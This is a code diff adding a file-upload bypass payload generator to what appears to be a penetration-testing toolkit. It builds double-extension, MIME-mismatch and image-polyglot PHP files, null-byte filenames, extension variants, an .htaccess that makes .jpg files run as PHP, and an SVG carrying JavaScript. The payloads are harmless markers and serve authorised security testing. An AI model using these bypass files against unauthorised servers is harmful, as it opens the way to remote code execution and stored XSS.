@@ -974,6 +974,160 @@ VAPT_PAYLOADS = {
 }
 
 
+# ── Upload Bypass Payloads (Magika-validated) ────────────────────────────────
+
+from dataclasses import dataclass as _dataclass
+
+
+@_dataclass
+class UploadPayload:
+    """A file upload evasion test payload."""
+    filename: str       # e.g., "shell.php.jpg"
+    content: bytes      # Actual file bytes
+    claimed_mime: str   # MIME sent in Content-Type header
+    true_type: str      # What the content actually is
+    technique: str      # Human-readable technique name
+
+
+# Magic byte headers for polyglot construction
+_GIF_HEADER = b"GIF89a"
+_PNG_HEADER = b"\x89PNG\r\n\x1a\n"
+_JPEG_HEADER = b"\xff\xd8\xff\xe0"
+_PDF_HEADER = b"%PDF-1.4\n"
+
+_PHP_PAYLOAD = b'<?php echo "MAGIKA_VAPT_TEST"; phpinfo(); ?>'
+_JSP_PAYLOAD = b'<% out.println("MAGIKA_VAPT_TEST"); %>'
+_ASPX_PAYLOAD = b'<%@ Page Language="C#" %><% Response.Write("MAGIKA_VAPT_TEST"); %>'
+_SHELL_PAYLOAD = b'#!/bin/bash\necho "MAGIKA_VAPT_TEST"\nid\nwhoami\n'
+_SVG_XSS_PAYLOAD = (
+    b'<?xml version="1.0" encoding="UTF-8"?>\n'
+    b'<svg xmlns="http://www.w3.org/2000/svg" '
+    b'onload="alert(\'MAGIKA_VAPT_XSS\')">\n'
+    b'<text x="0" y="20">VAPT Test</text>\n</svg>'
+)
+_HTACCESS_PAYLOAD = (
+    b"AddType application/x-httpd-php .jpg\n"
+    b"# VAPT test - if this works, .jpg files execute as PHP\n"
+)
+
+
+def generate_upload_payloads() -> list[UploadPayload]:
+    """Generate file upload evasion test payloads (7 technique categories).
+
+    Each payload disguises executable content as a benign file type.
+    After upload, use FileClassifier to verify the server stored the
+    true content type — confirming a bypass.
+    """
+    payloads = []
+
+    # ── 1. Double extension ──────────────────────────────────────────────
+    # Servers that only check the last extension (.jpg) miss .php
+    for ext, content, true_t in [
+        ("php.jpg", _PHP_PAYLOAD, "php"),
+        ("php.png", _PHP_PAYLOAD, "php"),
+        ("jsp.gif", _JSP_PAYLOAD, "jsp"),
+        ("aspx.pdf", _ASPX_PAYLOAD, "aspx"),
+    ]:
+        payloads.append(UploadPayload(
+            filename=f"shell.{ext}",
+            content=content,
+            claimed_mime="image/jpeg",
+            true_type=true_t,
+            technique="Double extension",
+        ))
+
+    # ── 2. MIME mismatch ─────────────────────────────────────────────────
+    # Content is PHP but Content-Type claims image/jpeg
+    payloads.append(UploadPayload(
+        filename="avatar.jpg",
+        content=_PHP_PAYLOAD,
+        claimed_mime="image/jpeg",
+        true_type="php",
+        technique="MIME mismatch",
+    ))
+    payloads.append(UploadPayload(
+        filename="document.pdf",
+        content=_SHELL_PAYLOAD,
+        claimed_mime="application/pdf",
+        true_type="shell",
+        technique="MIME mismatch",
+    ))
+
+    # ── 3. Magic byte prepend (polyglot) ─────────────────────────────────
+    # First bytes look like an image, rest is PHP
+    payloads.append(UploadPayload(
+        filename="image.gif",
+        content=_GIF_HEADER + b"\n" + _PHP_PAYLOAD,
+        claimed_mime="image/gif",
+        true_type="php",
+        technique="Magic byte prepend (GIF89a + PHP)",
+    ))
+    payloads.append(UploadPayload(
+        filename="photo.jpg",
+        content=_JPEG_HEADER + b"\x00" * 6 + b"\n" + _PHP_PAYLOAD,
+        claimed_mime="image/jpeg",
+        true_type="php",
+        technique="Magic byte prepend (JPEG + PHP)",
+    ))
+    payloads.append(UploadPayload(
+        filename="icon.png",
+        content=_PNG_HEADER + b"\x00" * 4 + b"\n" + _PHP_PAYLOAD,
+        claimed_mime="image/png",
+        true_type="php",
+        technique="Magic byte prepend (PNG + PHP)",
+    ))
+
+    # ── 4. Null byte injection ───────────────────────────────────────────
+    # Legacy parsers truncate at %00, so shell.php%00.jpg → shell.php
+    payloads.append(UploadPayload(
+        filename="shell.php%00.jpg",
+        content=_PHP_PAYLOAD,
+        claimed_mime="image/jpeg",
+        true_type="php",
+        technique="Null byte injection",
+    ))
+    payloads.append(UploadPayload(
+        filename="shell.php\x00.jpg",
+        content=_PHP_PAYLOAD,
+        claimed_mime="image/jpeg",
+        true_type="php",
+        technique="Null byte injection (raw)",
+    ))
+
+    # ── 5. Case variation ────────────────────────────────────────────────
+    # Blocklists checking ".php" miss ".pHp", ".PHP", ".phtml"
+    for ext in ["pHp", "PhP", "pHP", "phtml", "php5", "pht"]:
+        payloads.append(UploadPayload(
+            filename=f"test.{ext}",
+            content=_PHP_PAYLOAD,
+            claimed_mime="application/octet-stream",
+            true_type="php",
+            technique=f"Case/extension variation (.{ext})",
+        ))
+
+    # ── 6. .htaccess upload ──────────────────────────────────────────────
+    # If .htaccess can be uploaded, attacker controls server config
+    payloads.append(UploadPayload(
+        filename=".htaccess",
+        content=_HTACCESS_PAYLOAD,
+        claimed_mime="text/plain",
+        true_type="htaccess",
+        technique="Apache config override (.htaccess)",
+    ))
+
+    # ── 7. SVG with JavaScript (stored XSS) ──────────────────────────────
+    # SVG is often allowed as an "image" but can contain JS
+    payloads.append(UploadPayload(
+        filename="logo.svg",
+        content=_SVG_XSS_PAYLOAD,
+        claimed_mime="image/svg+xml",
+        true_type="svg",
+        technique="SVG with embedded JavaScript",
+    ))
+
+    return payloads
+
+
 def print_payloads(category: str) -> None:
     """Print payloads for a given category."""
     p = VAPT_PAYLOADS[category]
